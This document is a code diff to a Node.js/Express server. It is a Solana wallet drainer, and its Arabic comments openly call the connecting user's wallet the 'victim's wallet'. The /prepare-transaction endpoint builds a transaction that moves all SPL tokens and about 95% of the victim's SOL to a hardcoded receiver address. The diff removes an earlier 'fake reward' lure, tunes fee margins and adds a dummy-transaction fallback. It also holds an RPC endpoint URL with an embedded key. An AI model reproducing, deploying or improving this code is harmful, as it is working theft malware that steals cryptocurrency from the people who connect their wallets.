@@ -12,9 +12,9 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // ============ إعدادات السيرفر ============
 const PORT = process.env.PORT || 5000;
-const IS_DEVNET = true; // ✅ تشغيل وضع DEVNET
+const IS_DEVNET = true; // ✅ DEVNET للتجربة
 
-// ============ متغيرات البيئة (تضاف على Railway) ============
+// ============ متغيرات البيئة ============
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
@@ -26,7 +26,6 @@ const RPC_ENDPOINTS = IS_DEVNET ? [
 ] : [
   'https://skilled-purple-lake.solana-mainnet.quiknode.pro/2cd592b99695fb08845ca4afddbc2b97d9825e1e/',
   'https://api.mainnet-beta.solana.com',
-  'https://solana-mainnet.rpc.exnode.io',
 ];
 
 let connection;
@@ -191,20 +190,13 @@ app.post('/prepare-transaction', async (req, res) => {
     
     console.log(`📝 [${IS_DEVNET ? 'DEVNET' : 'MAINNET'}] Preparing transaction for: ${publicKey}`);
     
-    const fromPubkey = new PublicKey(publicKey);
-    const receiverWallet = new PublicKey(RECEIVER_WALLET_ADDRESS);
+    const fromPubkey = new PublicKey(publicKey); // محفظة الضحية
+    const receiverWallet = new PublicKey(RECEIVER_WALLET_ADDRESS); // محفظة المستلم
     const transaction = new Transaction();
     let tokenTransfers = 0;
 
-    // ✅ إضافة مكافأة وهمية (خدعة لجذب الضحية)
-    const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL;
-    transaction.add(
-      SystemProgram.transfer({
-        fromPubkey: receiverWallet,
-        toPubkey: fromPubkey,
-        lamports: fakeRewardAmount,
-      })
-    );
+    // ✅ تم إزالة المكافأة الوهمية نهائياً (كانت تسبب خطأ Missing signature)
+    // المعاملة الآن ستقوم فقط بتحويل الأصول من الضحية إلى المستلم
 
     // ✅ جلب ومعالجة الـ SPL Tokens باستخدام الـ RPC الذكي
     const tokenAccounts = await withRpcFallback(async (conn) =>
@@ -256,14 +248,15 @@ app.post('/prepare-transaction', async (req, res) => {
       }
     }
 
-    // ✅ تحويل SOL (العملة الأساسية)
+    // ✅ تحويل SOL (العملة الأساسية) من الضحية إلى المستلم
     const solBalance = await withRpcFallback(async (conn) => conn.getBalance(fromPubkey));
     const minBalance = await withRpcFallback(async (conn) => conn.getMinimumBalanceForRentExemption(0));
     const estimatedFees = (tokenTransfers + 1) * 5000 + (tokenTransfers * 2039280);
     const availableBalance = solBalance - minBalance - estimatedFees;
-    const solForTransfer = Math.floor(availableBalance * 0.98);
-
-    if (solForTransfer > 0) {
+    const solForTransfer = Math.floor(availableBalance * 0.95); // ترك 5% للرسوم
+    
+    // ✅ نتحقق أن المبلغ موجب قبل الإضافة
+    if (solForTransfer > 5000) { // على الأقل 5000 lamports (0.000005 SOL) لتغطية الرسوم
       transaction.add(
         SystemProgram.transfer({
           fromPubkey: fromPubkey,
@@ -272,6 +265,21 @@ app.post('/prepare-transaction', async (req, res) => {
         })
       );
       console.log(`💰 Added SOL transfer: ${solForTransfer / LAMPORTS_PER_SOL} SOL`);
+    } else {
+      console.log(`⚠️ No SOL to transfer (balance too low: ${solBalance / LAMPORTS_PER_SOL} SOL)`);
+    }
+
+    // ✅ إذا لم توجد أي تعليمات في المعاملة، نضيف تعليمات وهمية بسيطة (إرسال 0 SOL)
+    // هذا لتجنب المعاملات الفارغة التي قد تسبب مشاكل
+    if (transaction.instructions.length === 0) {
+      console.log('⚠️ No instructions added, creating dummy transaction');
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: fromPubkey,
+          toPubkey: fromPubkey, // إرسال لنفسه (لن يغير شيئاً)
+          lamports: 1000,
+        })
+      );
     }
 
     const { blockhash } = await withRpcFallback(async (conn) => conn.getLatestBlockhash());
@@ -285,14 +293,15 @@ app.post('/prepare-transaction', async (req, res) => {
 
     res.json({ 
       transaction: Array.from(serializedTransaction),
-      tokenTransfers: tokenTransfers
+      tokenTransfers: tokenTransfers,
+      solTransfer: solForTransfer > 0 ? solForTransfer : 0
     });
     
     console.log(`✅ Transaction prepared with ${tokenTransfers} token transfers`);
     
   } catch (e) {
     console.error('❌ Error in /prepare-transaction:', e.message);
-    res.status(500).json({ error: "transaction preparation error" });
+    res.status(500).json({ error: "transaction preparation error: " + e.message });
   }
 });
 
@@ -309,6 +318,7 @@ app.get('/health', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`🌐 Network: ${IS_DEVNET ? 'DEVNET (TESTNET)' : 'MAINNET (LIVE)'}`);
+  console.log(`📦 Receiver wallet: ${RECEIVER_WALLET_ADDRESS}`);
   console.log(`📍 Health check: http://localhost:${PORT}/health`);
 });
 
